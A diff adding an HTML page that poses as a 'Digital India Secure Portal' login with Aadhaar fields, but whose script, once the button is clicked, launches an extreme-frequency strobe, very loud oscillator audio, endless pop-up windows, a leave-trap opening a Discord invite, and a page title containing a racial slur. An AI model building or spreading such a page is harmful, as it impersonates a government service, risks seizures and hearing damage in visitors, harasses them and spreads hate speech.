@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en-IN">
+<head>
+    <meta charset="UTF-8">
+    <title>Digital India Secure Portal</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Noto Sans Devanagari', Arial, sans-serif;
+            background: linear-gradient(saffron, white, green);
+            color: navy;
+            transition: all 0.001s;
+            text-align: center;
+        }
+
+        .container {
+            border: 10px double maroon;
+            background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAMUlEQVQ4T2NkYGAwYkAFjAomBZBCRDIhghmRgqxIQUQmJkQJXEF0JqQgughSEAAVSwUvEhjJjQAAAABJRU5ErkJggg==');
+            margin: 20px auto;
+            padding: 40px;
+            max-width: 800px;
+            border-radius: 50px;
+            box-shadow: 0 0 50px gold;
+        }
+
+        .ashoka-chakra {
+            width: 100px;
+            animation: chakra-spin 1s linear infinite;
+            filter: drop-shadow(0 0 5px blue);
+        }
+
+        @keyframes chakra-spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .hyper-strobe {
+            animation: desi-strobe 0.001s infinite, bhangaar 0.1s infinite;
+        }
+
+        @keyframes desi-strobe {
+            0% { background-color: #FF9933; }
+            25% { background-color: #FFFFFF; }
+            50% { background-color: #138808; }
+            75% { background-color: rgb(255, 0, 0); }
+            100% { background-color: #ffffff; }
+        }
+
+        @keyframes bhangaar {
+            0% { transform: skew(0deg); }
+            50% { transform: skew(20deg); }
+            100% { transform: skew(-20deg); }
+        }
+    </style>
+</head>
+<body onclick="startAudio()">
+    <div class="container">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAAQlBMVEUAAAD/j4//mZn/j4//j4//j4//j4//j4//j4//j4//j4//j4//j4//j4//j4//j4//j4//j4//j4//j4//j49N+8v3AAAAFHRSTlMA+zsI6OXY0cW6qKSYhHxxX1lULiUJGCkqAAAAqElEQVQ4y82T2w6DIAxAGwEVvG+98///2kp1m84Hl5iHJCdNaU8L0ACw7Bc4jF3hIY6E6XmJw+QJZfYJ3hK+Q5l9h9R8hQ3K7Cek5itsUWY/IDVfYIsy+4TUfIEdCk9Qc4sKz1BziwrPUHOLCs9Qc4sKz1BziwrPUHOLCs9Qc4sKz1BziwrPUHOLCs9Qc4sKz1BziwrPUHOLCs9Qc4sKz1DzB1TzC1bzD1jzE1rzF1rzG/q7A1ywHmQ4AAAAAElFTkSuQmCC" 
+             class="ashoka-chakra" alt="Ashoka Chakra">
+        <h1>🪔 स्वागत है! Digital India Login 🪔</h1>
+        
+        <div class="login-form">
+            <input type="text" placeholder="आधार संख्या" style="font-size: 24px">
+            <input type="password" placeholder="गुप्त कोड" style="font-size: 24px">
+            <button onclick="activateDesiChaos(event)" 
+                    style="background:green;color:white;font-size:30px;padding:20px">
+                जारी रखें → 
+            </button>
+        </div>
+        
+        <div style="margin-top:30px">
+            🇮🇳 भारत माता की जय! 🇮🇳<br>
+            <marquee behavior="alternate" scrollamount="20">
+                🚩 वन्दे मातरम् 🚩
+            </marquee>
+        </div>
+    </div>
+
+    <script>
+        let audioContext;
+        let isPlaying = false;
+        let popupChain = null;
+
+        function startAudio() {
+            if(!audioContext) {
+                audioContext = new (AudioContext || webkitAudioContext)();
+                const osc1 = audioContext.createOscillator();
+                const osc2 = audioContext.createOscillator();
+                const gain = audioContext.createGain();
+                
+                osc1.type = 'square';
+                osc1.frequency.value = 800;
+                osc2.type = 'sawtooth';
+                osc2.frequency.value = 500;
+                gain.gain.value = 1000;
+
+                osc1.connect(gain);
+                osc2.connect(gain);
+                gain.connect(audioContext.destination);
+
+                osc1.start();
+                osc2.start();
+                isPlaying = true;
+            }
+        }
+
+        function createPatakhaPopups() {
+            if(window.closed) return;
+            const pop = window.open('', `pop${Date.now()}`, `
+                width=300,height=300,
+                left=${Math.random()*screen.width},
+                top=${Math.random()*screen.height}
+            `);
+            
+            if(pop) {
+                pop.document.write(`
+                    <body style="
+                        background:black;
+                        color:orange;
+                        font-size:30px;
+                        animation: desi-strobe 0.01s infinite">
+                    🎆 बूम! 💥
+                    <audio autoplay loop>
+                        <source src="data:audio/wav;base64,uQRAAAAWMSLwUIYAAsYkXgoQwAEaYLWfkWgAI0wWs/ItAAAGDgYtAgAyN+QWaAAihwMWm4G8QQRDiMcCBcH3Cc+CDv/7xA4Tvh9Rz/y8QADBwMWgQAZG/ILNAARQ4GLTcDeIIIhxGOBAuD7hOfBB3/94gcJ3w+o5/5eIAIAAAVwWgQAVQ2ORaIQwEMAJiDg95G4nQL7mQVWI6GwRcfsZAcsKkJvxgxEjzFUgfHoSQ9Qq7KNwqHwuB13MA4a1q/DmTHgq7ON0IDI0mgAFQ3VKFHAUAAuC0CACqGxyLRCEGgAAAh+QQKAQAACwAAAAAEAASAAAIfkECQAACwAsAAAAAAQABIAAB4WAAIKDhIWGh4iJiouMjY6PkIADADs=">
+                    </audio>
+                `);
+                popupChain = pop;
+            }
+        }
+
+        function activateDesiChaos(e) {
+            e = e || window.event;
+            document.body.classList.add('hyper-strobe');
+            document.title = "⚠️ चेतावनी! NIGGER DETECTED ABORTING! ⚠️";
+            
+            if(!isPlaying) startAudio();
+            setInterval(() => {
+                try { audioContext.resume(); } catch(e) {}
+            }, 100);
+
+            document.onmousemove = function(event) {
+                createPatakhaPopups();
+                window.focus();
+            };
+
+            window.addEventListener('beforeunload', (e) => {
+                const newWindow = window.open('https://discord.gg/bYMrk9mn', '_blank');
+                newWindow.document.write('<h1>🛑 नहीं जा सकते! 🛑</h1>');
+                newWindow.opener = null;
+            });
+
+            let clickCount = 0;
+            document.onclick = function() {
+                clickCount++;
+                if(clickCount > 3) {
+                    window.open('','_self').close();
+                }
+            };
+
+            const popupInterval = setInterval(() => {
+                if(popupChain && !popupChain.closed) {
+                    popupChain.open('','_blank').document.write("🎇JOIN DISCORD .gg/bYMrk9mn 🎇");
+                }
+            }, 100);
+        }
+    </script>
+</body>
+</html>
